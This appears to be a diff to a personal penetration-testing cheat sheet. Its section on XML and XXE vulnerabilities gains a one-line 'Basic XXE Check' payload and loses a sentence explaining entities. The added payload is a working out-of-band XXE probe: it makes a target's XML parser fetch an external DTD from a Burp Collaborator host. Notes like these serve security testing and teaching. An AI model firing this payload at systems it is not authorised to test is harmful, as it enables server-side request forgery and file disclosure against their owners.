@@ -1348,10 +1348,12 @@ x-jenkins 200
 
 XML is essential a language designed to transport data in a structured format, ,similar to JSON.
 
+Basic XXE Check
+
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE data SYSTEM "http://123123123.burpcollaborator.net/m0chan.dtd"><data>&all;</data>
+
 XXE is a vuln that occurs when an application parses XML. 
 
-
-Essentially there are something called ENTITYs within XML that really acts as a var that be called, something like
 
 <?xml version="1.0"?>
 <!DOCTYPE note [
